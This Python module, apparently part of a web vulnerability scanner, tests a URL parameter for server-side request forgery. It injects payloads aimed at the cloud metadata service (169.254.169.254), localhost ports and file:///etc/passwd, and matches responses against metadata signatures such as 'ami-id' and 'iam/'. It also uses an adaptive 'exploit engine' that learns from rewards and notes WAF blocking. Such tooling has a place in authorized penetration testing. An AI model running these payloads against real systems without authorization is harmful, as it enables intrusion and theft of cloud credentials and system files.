"""SSRF validation with reward feedback."""

from __future__ import annotations

import time
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import aiohttp

from core.adaptive_exploit_engine import AdaptiveExploitEngine, compute_reward
from .registry import register
from core.local_payload_engine import suggest_payloads

PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80",
    "http://localhost:22",
    "http://[::1]",
    "file:///etc/passwd",
]

SIGNATURES = ("ami-id", "instance-id", "iam/", "hostname", "connection refused")


async def _fetch(session: aiohttp.ClientSession, url: str) -> tuple[float, int, str]:
    start = time.monotonic()
    try:
        async with session.get(url, timeout=20, ssl=False) as response:
            body = await response.text(errors="ignore")
            return time.monotonic() - start, response.status, body
    except Exception:
        return 999.0, 0, ""


@register("ssrf")
async def validate_ssrf(url: str, param: str, timeout: int = 20) -> dict | None:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    _engine = AdaptiveExploitEngine()

    qs[param] = ["test"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

    async with aiohttp.ClientSession(headers={"User-Agent": "zentry-trail"}) as session:
        baseline_time, _, baseline_body = await _fetch(session, baseline_url)

        payloads = suggest_payloads("ssrf", n=12) or PAYLOADS
        for payload in payloads:
            qs[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            response_time, status_code, body = await _fetch(session, test_url)
            waf = "blocked" if "blocked" in body.lower() or "ray id" in body.lower() else "unknown"

            if any(signature in body.lower() for signature in SIGNATURES):
                _engine.record_result(payload, "ssrf", reward=1.0, waf=waf, tech=[])
                return {
                    "validated": True,
                    "type": "SSRF",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": "SSRF signature matched",
                }

            reward = 0.0 if waf == "blocked" else compute_reward(
                validated=False,
                response_time=response_time,
                baseline_time=baseline_time,
                response_body=body,
                baseline_body=baseline_body,
                status_code=status_code,
                waf_blocked=False,
                payload=payload,
            )
            _engine.record_result(payload, "ssrf", reward=reward, waf=waf, tech=[])

    return None